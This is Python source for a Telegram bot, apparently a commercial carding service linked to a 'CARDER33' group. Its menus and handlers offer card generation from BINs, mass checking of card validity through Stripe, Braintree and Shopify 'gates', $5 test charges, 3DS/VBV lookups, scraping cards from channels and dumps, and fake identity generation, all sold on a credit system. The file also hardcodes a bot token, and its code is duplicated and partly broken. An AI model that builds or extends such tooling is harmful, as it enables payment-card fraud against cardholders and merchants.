import os
import time 
import logging
import asyncio 
import aiohttp
import re
import psutil
import random
from datetime import datetime, timedelta
from db import get_user, update_user, init_db
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram.error import BadRequest
from faker import Faker
import pytz
import uuid
from config import ADMIN_IDS


# === CONFIGURATION ===
# IMPORTANT: Hardcoded bot token and owner ID for direct use (no environment variables required)
TOKEN = "8482235621:AAGoRfV7pFVAcXJxmSd0P4W2oKljXbJDv9s"
OWNER_ID = 8493360284



# --- New Configuration ---
AUTHORIZATION_CONTACT = "@Kalinuxxx"
OFFICIAL_GROUP_LINK = "https://t.me/CARDER33"
DEFAULT_FREE_CREDITS = 200  # A non-expiring credit pool for free users

# === PERSISTENCE WARNING ===
# The following dictionaries store data in-memory and will be LOST when the bot
# is redeployed. For a production environment on Railway, you MUST replace
# this with a real database solution like PostgreSQL.
#
# A simple approach for your use case would be:
# 1. Add a `psycopg2` or `asyncpg` library to your requirements.txt.
# 2. Set up a PostgreSQL database on Railway.
# 3. Create functions to connect to the database and perform CRUD operations
#    (Create, Read, Update, Delete) on user data.
# 4. Replace `USER_DATA_DB` and `REDEEM_CODES` with calls to these database functions.
#
# --- GLOBAL STATE (In-Memory) ---
user_last_command = {}
AUTHORIZED_CHATS = set()
AUTHORIZED_PRIVATE_USERS = set()
REDEEM_CODES = {} # New dictionary to store redeem codes
USER_DATA_DB = {
    OWNER_ID: {
        'credits': 9999,
        'plan': 'PLUS',
        'status': 'Owner',
        'plan_expiry': 'N/A',
        'keys_redeemed': 0,
        'registered_at': '03-08-2025'
    }
}
# Initialize Faker
fake = Faker()

# === LOGGING SETUP ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# === HELPER FUNCTIONS ===
def escape_markdown_v2(text: str) -> str:
    """Escapes markdown v2 special characters."""
    special_chars = r"([_*\[\]()~`>#+\-=|{}.!])"
    return re.sub(special_chars, r"\\\1", text)

def get_level_emoji(level):
    level_lower = level.lower()
    if "gold" in level_lower:
        return "🌟"
    elif "platinum" in level_lower:
        return "💎"
    elif "premium" in level_lower:
        return "✨"
    elif "infinite" in level_lower:
        return "♾️"
    elif "corporate" in level_lower:
        return "💼"
    elif "business" in level_lower:
        return "📈"
    elif "standard" in level_lower or "classic" in level_lower:
        return "💳"
    return "💡"

def get_vbv_status_display(status):
    if status is True:
        return "✅ LIVE"
    elif status is False:
        return "❌ DEAD"
    else:
        return "🤷 N/A"

def luhn_checksum(card_number):
    """Checks if a credit card number is valid using the Luhn algorithm."""
    digits = [int(d) for d in card_number if d.isdigit()]
    total = 0
    num_digits = len(digits)
    parity = num_digits % 2
    for i, digit in enumerate(digits):
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

from db import get_user, update_user  # your async DB functions
from datetime import datetime

DEFAULT_FREE_CREDITS = 200
DEFAULT_PLAN = "Free"
DEFAULT_STATUS = "Free"
DEFAULT_PLAN_EXPIRY = "N/A"
DEFAULT_KEYS_REDEEMED = 0

async def get_user_data(user_id):
    """
    Fetch user data from DB; if not exists, create with defaults then fetch.
    """
    user_data = await get_user(user_id)
    if not user_data:
        now_str = datetime.now().strftime('%d-%m-%Y')
        # Insert new user with defaults
        await update_user(
            user_id,
            credits=DEFAULT_FREE_CREDITS,
            plan=DEFAULT_PLAN,
            status=DEFAULT_STATUS,
            plan_expiry=DEFAULT_PLAN_EXPIRY,
            keys_redeemed=DEFAULT_KEYS_REDEEMED,
            registered_at=now_str
        )
        # Fetch again after insertion
        user_data = await get_user(user_id)
    return user_data


async def consume_credit(user_id: int) -> bool:
    """
    Deduct 1 credit if available. Return True if succeeded.
    """
    user_data = await get_user_data(user_id)
    if user_data and user_data.get('credits', 0) > 0:
        new_credits = user_data['credits'] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


async def add_credits_to_user(user_id: int, amount: int):
    """
    Add credits to user, creating user if needed.
    Return updated credits or None if failure.
    """
    user_data = await get_user_data(user_id)
    if not user_data:
        return None
    new_credits = user_data.get('credits', 0) + amount
    await update_user(user_id, credits=new_credits)
    return new_credits


async def enforce_cooldown(user_id: int, update: Update) -> bool:
    """Enforces a 5-second cooldown per user."""
    current_time = time.time()
    last_command_time = user_last_command.get(user_id, 0)
    if current_time - last_command_time < 5:
        await update.effective_message.reply_text("⏳ Please wait 5 seconds before retrying\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return False
    user_last_command[user_id] = current_time
    return True

from config import OWNER_ID  # Ensure OWNER_ID is loaded from environment or config


# === CONFIG ===
# Only this group is authorized
AUTHORIZED_GROUP_ID = -1002554243871

# List of your bot commands
BOT_COMMANDS = [
    "/start", "/cmds", "/gen", "/bin", "/chk", "/mchk", "/mass",
    "/mtchk", "/fk", "/fl", "/open", "/status", "/credits", "/info"
    "/scr", "/sh", "/seturl", "/sp", "scr", "/remove", "/b3" "/site"
    "/vbv", "/mvbv",
]

from telegram.ext import ApplicationHandlerStop

async def group_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    message = update.effective_message

    # Only check in groups
    if chat.type in ["group", "supergroup"]:
        # If the group is NOT the authorized group
        if chat.id != AUTHORIZED_GROUP_ID:
            if message.text:
                cmd = message.text.split()[0].lower()
                if cmd in BOT_COMMANDS:
                    await message.reply_text(
                        f"🚫 This group is not authorized to use this bot.\n\n"
                        f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                        f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                    )
                    # Stop other handlers from running
                    raise ApplicationHandlerStop
    # In private or the authorized group → do nothing, commands continue

# --- GLOBAL STATE ---
user_last_command = {}
AUTHORIZED_CHATS = set((-1002554243871,))  # Add your authorized group IDs here

BOT_COMMANDS = [
    "start", "cmds", "gen", "bin", "chk", "mchk", "mass",
    "mtchk", "fk", "fl", "open", "status", "credits", "info"
    "scr", "sh", "seturl", "sp", "scr", "remove", "b3", "site"
    "vbv", "mvbv"
]

from telegram.ext import ApplicationHandlerStop, filters

async def group_filter(update, context):
    chat = update.effective_chat
    message = update.effective_message

    # Only check commands in groups
    if chat.type in ["group", "supergroup"]:
        if chat.id not in AUTHORIZED_CHATS:
            # Check if the message contains a command
            if message.entities:
                for ent in message.entities:
                    if ent.type == "bot_command":
                        # Extract command without the "/"
                        cmd_text = message.text[ent.offset+1 : ent.offset+ent.length].split("@")[0].lower()
                        if cmd_text in BOT_COMMANDS:
                            await message.reply_text(
                                f"🚫 This group is not authorized to use this bot.\n\n"
                                f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                                f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                            )
                            # Stop other handlers (so the command is not executed)
                            raise ApplicationHandlerStop
    # Private chats or authorized groups → do nothing


from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    filters,
)

closed_commands = set()

# Check if command is closed
async def check_closed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cmd = update.message.text.split()[0][1:].split("@")[0].lower()
    if cmd in closed_commands:
        await update.message.reply_text(
            "🚧 𝗚𝗮𝘁𝗲 𝗨𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗘𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗨𝗽𝗱𝗮𝘁𝗲𝘀 𝗔𝗿𝗲 𝗼𝗻 𝘁𝗵𝗲 𝗪𝗮𝘆! 🚧"
        )
        return False  # Block command
    return True  # Allow command

# /close
async def close_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /close <command>")
        return
    closed_commands.add(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now closed.")

# /restart
async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /restart <command>")
        return
    closed_commands.discard(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now available.")

# Example command
async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ /sh command executed!")

# Wrapper to block closed commands
def command_with_check(handler_func, command_name):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if command_name in closed_commands:
            await update.message.reply_text(
                "🚧 𝗚𝗮𝘁𝗲 𝗨𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗘𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗨𝗽𝗱𝗮𝘁𝗲𝘀 𝗔𝗿𝗲 𝗼𝗻 𝘁𝗵𝗲 𝗪𝗮𝘆! 🚧"
            )
            return
        await handler_func(update, context)
    return wrapper



from datetime import datetime
import logging
import pytz
import re

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user  # your db user fetch

# Links
BULLET_GROUP_LINK = "https://t.me/CARDER33"
OFFICIAL_GROUP_LINK = "https://t.me/CARDER33"
DEV_LINK = "https://t.me/Kalinuxxx"

logger = logging.getLogger(__name__)

# ---------- Utilities ----------
import logging
import re
import pytz
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Assuming these imports and functions exist in your project.
from db import get_user

# --------------------
# Configuration
# --------------------
# Links for the inline keyboard buttons
BULLET_GROUP_LINK = "https://t.me/CARDER33"
OFFICIAL_GROUP_LINK = "https://t.me/CARDER33"
DEV_LINK = "https://t.me/Kalinuxxx"

# Set up logging for better error tracking
logger = logging.getLogger(__name__)

# --------------------
# Utility Functions
# --------------------
import re

def escape_all_markdown(text: str) -> str:
    """
    Escapes all MarkdownV2 special characters to prevent formatting issues
    when sending text with ParseMode.MARKDOWN_V2.
    """
    special_chars = r"[_*\[\]()~`>#+-=|{}.!%]"
    return re.sub(special_chars, r"\\\g<0>", str(text))

def build_final_card(*, user_id: int, username: str | None, credits: int, plan: str, date_str: str, time_str: str) -> str:
    """
    Constructs the final profile card text for the welcome message.
    """
    uname = f"@{username}" if username else "N/A"

    # Properly escaped clickable bullet with brackets
    bullet_text = escape_all_markdown("[⌇]")
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    return (
        "✦━━━━━━━━━━━━━━✦\n"
        "     ⚡ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        f"{bullet_link} ID       : `{escape_all_markdown(str(user_id))}`\n"
        f"{bullet_link} Username : `{escape_all_markdown(uname)}`\n"
        f"{bullet_link} Credits  : `{escape_all_markdown(str(credits))}`\n"
        f"{bullet_link} Plan     : `{escape_all_markdown(plan)}`\n"
        f"{bullet_link} Date     : `{escape_all_markdown(date_str)}`\n"
        f"{bullet_link} Time     : `{escape_all_markdown(time_str)}`\n\n"
        "⮞ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗹𝗶𝗰𝗸 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗽𝗿𝗼𝗰𝗲𝗲𝗱 👇"
    )


async def get_user_cached(user_id, context):
    """
    Retrieves user profile data from the database, using a cache
    (context.user_data) to speed up subsequent calls.
    """
    if "profile" in context.user_data:
        return context.user_data["profile"]
    user_data = await get_user(user_id)
    context.user_data["profile"] = user_data
    return user_data

def get_main_keyboard() -> InlineKeyboardMarkup:
    """
    Creates and returns the main inline keyboard with all primary buttons.
    """
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚪 𝐆𝐚𝐭𝐞𝐬", callback_data="gates_menu"),
            InlineKeyboardButton("⌨️ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬", callback_data="tools_menu")
        ],
        [
            InlineKeyboardButton("⚡ 𝐒𝐜𝐫𝐚𝐩𝐩𝐞𝐫", callback_data="scrapper_menu"),
            InlineKeyboardButton("💎 Owner", url=DEV_LINK)
        ],
        [InlineKeyboardButton("👥 Official Group", url=OFFICIAL_GROUP_LINK)],
        [InlineKeyboardButton("🔐 3DS Lookup", callback_data="ds_lookup")]
    ])

async def build_start_message(user, context) -> tuple[str, InlineKeyboardMarkup]:
    """
    Assembles the complete message text and keyboard for the welcome message.
    """
    tz = pytz.timezone("Asia/Kolkata")
    now_dt = datetime.now(tz)
    date_str = now_dt.strftime("%d-%m-%Y")
    time_str = now_dt.strftime("%I:%M %p")
    user_data = await get_user_cached(user.id, context)
    credits = int(user_data.get("credits", 0))
    plan = str(user_data.get("plan", "Free"))
    
    text = build_final_card(
        user_id=user.id,
        username=user.username,
        credits=credits,
        plan=plan,
        date_str=date_str,
        time_str=time_str,
    )
    return text, get_main_keyboard()

# --------------------
# Command and Callback Handlers
# --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles the /start command. It sends a single message containing
    the welcome image, profile card, and inline keyboard.
    """
    user = update.effective_user
    logger.info(f"/start by {user.id} (@{user.username})")
    
    # Get the text and keyboard from the helper function
    text, keyboard = await build_start_message(user, context)
    
    # Get the message object to reply to
    msg = update.message or update.effective_message
    
    # Send a photo with a caption. The caption is where the text and buttons appear.
    await msg.reply_photo(
        photo="https://i.postimg.cc/hjNQNyP1/1ea64ac8-ad6a-42f2-89b1-3de4a0d8e447.png",
        caption=text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=keyboard,
    )

async def back_to_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Callback handler to return to the main start menu by editing the message.
    """
    q = update.callback_query
    await q.answer()
    text, keyboard = await build_start_message(q.from_user, context)
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=keyboard,
    )

async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Commands' button."""
    q = update.callback_query
    await q.answer()

    def escape_md(text: str) -> str:
        """Escape all MarkdownV2 special characters."""
        special_chars = r"[_*\[\]()~`>#+-=|{}.!]"
        return re.sub(special_chars, r"\\\g<0>", str(text))

    bullet_text = escape_all_markdown("[⌇]")
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "     ⚡ 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 ⚡\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        f"{bullet_link} `/start` – Welcome message\n"
        f"{bullet_link} `/cmds` – Shows all commands\n"
        f"{bullet_link} `/gen` `[bin]` `[no\\. of cards]` – Generate cards\n"
        f"{bullet_link} `/bin` `<bin>` – BIN lookup\n"
        f"{bullet_link} `/vbv` –  3DS Lookup\n"
        f"{bullet_link} `/b3` `cc\\|mm\\|yy\\|cvv` – Braintree Premium Auth\n"
        f"{bullet_link} `/chk` `cc\\|mm\\|yy\\|cvv` – Stripe Auth\n"
        f"{bullet_link} `/mchk` –  Multi Stripe\n"
        f"{bullet_link} `/mass` –  Mass Stripe Auth 2\n"
        f"{bullet_link} `/mtchk` `txt file` Mass stripe Auth 3\n"
        f"{bullet_link} `/sh` Shopify 5\\$\n"
        f"{bullet_link} `/seturl` `<site url>` – Set a Shopify site\n"
        f"{bullet_link} `/remove` – Remove your added site\n"
        f"{bullet_link} `/sp` – Check on your added Shopify site\n"
        f"{bullet_link} `/site` – Check if Shopify site is working\n"
        f"{bullet_link} `/fk` – Generate fake identity info\n"
        f"{bullet_link} `/fl` `<dump>` – Fetch CCs from dump\n"
        f"{bullet_link} `/open` – Extract cards from a file\n"
        f"{bullet_link} `/status` – Bot system status info\n"
        f"{bullet_link} `/credits` – Check remaining credits\n"
        f"{bullet_link} `/info` – Show your user info\n\n"
    )


    keyboard = [[InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁o 𝗠𝗲𝗻𝘂", callback_data="back_to_start")]]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

async def gates_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Gates' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "     🚪 𝐆𝐚𝐭𝐞𝐬 𝗠𝗲𝗻𝘂\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "✨ Please select a feature below:"
    )
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⚡ 𝐀𝐮𝐭𝐡", callback_data="auth_sub_menu"),
            InlineKeyboardButton("💳 𝐂𝐡𝐚𝐫𝐠𝐞", callback_data="charge_sub_menu")
        ],
        [InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁o 𝗠𝗲𝗻𝘂", callback_data="back_to_start")]
    ])
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=keyboard,
    )

async def auth_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Auth' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "      🚪 𝐀𝐮𝐭𝐡 𝐆𝐚𝐭𝐞\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "✨ Select a platform below:"
    )
    keyboard = [
        [InlineKeyboardButton("💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛", callback_data="stripe_examples")],
        [InlineKeyboardButton("💎 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺", callback_data="braintree_examples")],
        [InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗚𝗮𝘁𝗲 𝗠𝗲𝗻𝘂", callback_data="gates_menu")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

# === Stripe Examples Handler ===
async def stripe_examples_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Stripe Auth' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "      💳 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "• `/chk` \\- *Check a single card*\n"
        "  Example:\n"
        "  `/chk 1234567890123456\\|12\\|24\\|123`\n\n"
        "• `/mchk` \\- *Check up to 10 cards at once*\n"
        "  Example:\n"
        "  `/mchk 1234567890123456\\|\\.\\.\\.`  \\# up to 10 cards\n\n"
        "• `/mass` \\- *Check up to 30 cards at once*\n"
        "  Example:\n"
        "  `/mass <cards>`\n\n"
        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\- 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
    )
    keyboard = [
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗔𝗨𝗧𝗛 𝗠𝗘𝗡𝗨", callback_data="auth_sub_menu")],
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


# === Braintree Premium Examples Handler ===
async def braintree_examples_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for 'Braintree Premium'."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "      💎 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝗺\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "• `/b3` \\- *Check a single Braintree card*\n"
        "  Example:\n"
        "  `/b3 1234567890123456\\|12\\|24\\|123`\n\n"
        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\- 𝑶𝒇𝒇 ❌"
    )
    keyboard = [
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗔𝗨𝗧𝗛 𝗠𝗘𝗡𝗨", callback_data="auth_sub_menu")],
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Charge' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "      ⚡ 𝐂𝐡𝐚𝐫𝐠𝐞 𝐆𝐚𝐭𝐞 ⚡\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "✨ Select a charge gate below:"
    )
    keyboard = [
        [InlineKeyboardButton("💸 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 5$", callback_data="shopify_gate")],
        [InlineKeyboardButton("⚡ 𝗔𝘂𝘁𝗼 𝗦𝗵𝗼𝗽𝗶𝗳𝘆", callback_data="autoshopify_gate")],
        [InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁o 𝗚𝗮𝘁𝗲 𝗠𝗲𝗻𝘂", callback_data="gates_menu")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Shopify 5$' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "      💸 <b>Shopify 5$</b>\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "• <code>/sh</code> - <i>Check a single card on Shopify $5</i>\n"
        "  Example:\n"
        "  <code>/sh 1234567890123456|12|2026|123</code>\n\n"
        "⚡ Use carefully, each check deducts credits.\n\n"
        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\– 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
    )
    keyboard = [
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗖𝗛𝗔𝗥𝗚𝗘 𝗠𝗘𝗡𝗨", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


async def autoshopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Auto Shopify' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "    ⚡ 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "• `/sp` \\- *Auto Shopify Checker*\n"
        "  Example:\n"
        "  `/sp 1234567890123456\\|12\\|2026\\|123`\n\n"
        "• `/seturl <shopify site>` \\- *Set your custom Shopify site*\n"
        "  Example:\n"
        "  `/seturl https:\\/\\/yourshopify\\.com`\n\n"
        "• `/remove` \\- *Remove your saved Shopify site*\n"
        "  Example:\n"
        "  `/remove`\n\n"
        "✨ First set your preferred Shopify site using `/seturl`\\.\n"
        "Then run `/sp` to automatically check cards on that site 🚀\n"
        "If you no longer want to𝗦𝘁𝗮𝘁𝘂𝘀 use a custom site, run `/remove`\\.\n\n"
        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\- 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
    )
    keyboard = [
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗖𝗛𝗔𝗥𝗚𝗘 𝗠𝗘𝗡𝗨", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

async def scrapper_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Scrapper' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "    ⚡ 𝐒𝐜𝐫𝐚𝐩𝐩𝐞𝐫\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "• `/scr` `<channel_username>` `<amount>`\n"
        "  Example:\n"
        "  `/scr @examplechannel 50`\n\n"
        "👉 Scrapes cards from the given channel\\.\n"
        "⚠️ Maximum amount allowed: *1000 cards*\\.\n\n"
        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\- 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
    )
    keyboard = [
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )



async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the '3DS Lookup' button."""
    q = update.callback_query
    await q.answer()
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "   🔐 𝟑𝐃𝐒 𝐋𝐨𝐨𝐤𝐮𝐩\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "• `/vbv` `<card|mm|yy|cvv>`\n"
        "  Example:\n"
        "  `/vbv 4111111111111111|12|2026|123`\n\n"
        "👉 Checks whether the card is *VBV \\(Verified by Visa\\)* or *NON\\-VBV*\\.\n"
        "⚠️ Ensure you enter the card details in the correct format\\.\n\n"
        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\- 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
    )
    keyboard = [
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
    ]
    await q.edit_message_caption(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )



async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles all inline button callback queries and routes them to the
    appropriate handler function.
    """
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "tools_menu":
        await show_tools_menu(update, context)
    elif data == "gates_menu":
        await gates_menu_handler(update, context)
    elif data == "auth_sub_menu":
        await auth_sub_menu_handler(update, context)
    elif data == "charge_sub_menu":
        await charge_sub_menu_handler(update, context)
    elif data == "shopify_gate":
        await shopify_gate_handler(update, context)
    elif data == "autoshopify_gate":
        await autoshopify_gate_handler(update, context)
    elif data == "stripe_examples":
        await stripe_examples_handler(update, context)
    elif data == "braintree_examples":
        await braintree_examples_handler(update, context)
    elif data == "scrapper_menu":
        await scrapper_menu_handler(update, context)
    elif data == "ds_lookup":
        await ds_lookup_menu_handler(update, context)
    elif data == "back_to_start":
        await back_to_start_handler(update, context)
    else:
        await q.answer("⚠️ Unknown option selected.", show_alert=True)







from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

BULLET_GROUP_LINK = "https://t.me/CARDER33"

def md_escape(text: str) -> str:
    """Escape text for Markdown V2."""
    escape_chars = r"_*[]()~`>#+-=|{}.!<>"
    return ''.join(f"\\{c}" if c in escape_chars else c for c in text)

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the bot's full commands menu with categories."""

    bullet_text = escape_all_markdown("[⌇]")
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    cmds_message = (
        "━━━[ 👇 *𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗠𝗲𝗻𝘂* ]━━━⬣\n\n"

        "🔹 *𝙎𝙩𝙧𝙞𝙥𝙚*\n"
        f"{bullet_link} `/chk cc\\|mm\\|yy\\|cvv` – Single Stripe Auth\n"
        f"{bullet_link} `/mchk` – Multi x10 Stripe Auth\n"
        f"{bullet_link} `/mass` – Mass x30 Stripe Auth 2\n"
        f"{bullet_link} `/mtchk txt file` – Mass x200 Stripe Auth 3\n\n"

       "🔹 *𝘽𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲*\n"
        f"{bullet_link} `/b3 cc\\|mm\\|yy\\|cvv` – Braintree Premium Auth\n"
        f"{bullet_link} `/vbv cc\\|mm\\|yy\\|cvv` – 3DS Lookup\n"

        "🔹 *𝙎𝙝𝙤𝙥𝙞𝙛𝙮*\n"
        f"{bullet_link} `/sh` – Shopify Charge \\$5\n"
